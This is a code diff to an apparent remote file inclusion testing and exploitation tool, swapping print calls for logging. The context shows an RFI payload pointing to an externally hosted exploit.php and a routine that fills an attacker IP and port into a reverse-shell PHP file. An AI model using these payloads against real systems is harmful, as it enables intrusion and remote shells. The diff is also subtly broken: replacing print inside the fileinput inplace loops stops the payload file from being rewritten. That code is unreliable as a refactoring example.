@@ -10,6 +10,7 @@ from src.configs import config
 from src.utils import colors
 from random import randint
 from src.utils.info import printInfo
+from src.utils.arguments import args, logging
 
 def random_with_N_digits(n):
     range_start = 10**(n-1)
@@ -19,7 +20,7 @@ def random_with_N_digits(n):
 def test_rfi(url, post):
 
     if(args.verbose):
-        print(colors.blue("[i]") + " Testing remote file inclusion...")
+        logging.info(colors.blue("[i]") + " Testing remote file inclusion...")
 
     #Localhost RFI test
     if(args.lhost):
@@ -28,7 +29,7 @@ def test_rfi(url, post):
             if(os.access(scriptDirectory + os.sep + "src/exploits", os.R_OK)):
                 config.webDir = scriptDirectory  + os.sep + "src/exploits"
             else:
-                print(colors.red("[-]") + "Directory '" + scriptDirectory + "/src/exploits' can't be accessed. Cannot setup local web server for RFI test.")
+                logging.info(colors.red("[-]") + "Directory '" + scriptDirectory + "/src/exploits' can't be accessed. Cannot setup local web server for RFI test.")
                 return
 
             threading.Thread(target=serve_forever).start()
@@ -51,7 +52,7 @@ def test_rfi(url, post):
             pass
 
     #Internet RFI test
-    if(args.verbose): print(colors.blue("[i]") + " Trying to include internet-hosted file...")
+    if(args.verbose): logging.info(colors.blue("[i]") + " Trying to include internet-hosted file...")
 
     pylds = []
     pylds.append("https%3A%2F%2Fgithub.com%2Fhansmach1ne%2FLFImap%2Fblob%2Fmain%2Fsrc%2Fexploits%2Fexploit.php")
@@ -77,7 +78,7 @@ def test_rfi(url, post):
 def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
     #Copy a file from exploits/reverse_shell.php
     if(not os.path.exists(payloadFile)):
-        print(colors.red("[-]") + " Cannot locate '" + payloadFile + "'. Skipping RFI exploit...")
+        logging.info(colors.red("[-]") + " Cannot locate '" + payloadFile + "'. Skipping RFI exploit...")
         return
     else:
         #Prepare file that will be included
@@ -92,10 +93,10 @@ def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
     with(fileinput.FileInput(temporaryFile, inplace = True)) as file:
         for line in file:
             #This redirects stdout to a file, replacing the ip and port values as needed
-            print(line.replace("IP_ADDRESS", ip))
+            logging.info(line.replace("IP_ADDRESS", ip))
     with(fileinput.FileInput(temporaryFile, inplace = True)) as file:
         for line in file:
-            print(line.replace("PORT_NUMBER", str(port)))
+            logging.info(line.replace("PORT_NUMBER", str(port)))
 
 
 def exploit_rfi(exploit, method, ip, port):
